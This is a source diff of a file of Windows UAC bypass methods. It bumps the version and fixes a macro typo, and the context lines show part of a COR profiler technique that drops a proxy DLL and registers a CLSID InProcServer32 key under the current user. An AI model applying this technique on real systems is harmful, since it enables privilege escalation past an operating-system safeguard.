@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.77
+*  VERSION:     2.78
 *
-*  DATE:        21 July 2017
+*  DATE:        30 July 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -2050,7 +2050,7 @@ BOOL ucmMethodCorProfiler(
             break;
 
         _strcpy(szBuffer, g_ctx.szTempDirectory);
-        _strcat(szBuffer, MYSTERIOSCUTETHING);
+        _strcat(szBuffer, MYSTERIOUSCUTETHING);
         _strcat(szBuffer, TEXT(".dll"));
         if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
             break;
@@ -2065,9 +2065,9 @@ BOOL ucmMethodCorProfiler(
             //
             // On Windows 7 target written on 3+ dotnet, registration required.
             //
-            _strcpy(szRegBuffer, TEXT("Software\\Classes\\CLSID\\"));
+            _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
             _strcat(szRegBuffer, OutputGuidString);
-            _strcat(szRegBuffer, TEXT("\\InProcServer32"));
+            _strcat(szRegBuffer, T_REG_INPROCSERVER32);
 
             hKey = NULL;
             lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szRegBuffer, 0, NULL,
@@ -2084,11 +2084,11 @@ BOOL ucmMethodCorProfiler(
                     (DWORD)sz);
 
                 RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
-                _strcpy(szRegBuffer, TEXT("Apartment"));
+                _strcpy(szRegBuffer, T_APARTMENT);
                 sz = (1 + _strlen(szRegBuffer)) * sizeof(WCHAR);
                 lResult = RegSetValueEx(
                     hKey,
-                    TEXT("ThreadingModel"),
+                    T_THREADINGMODEL,
                     0,
                     REG_SZ,
                     (BYTE*)szRegBuffer,
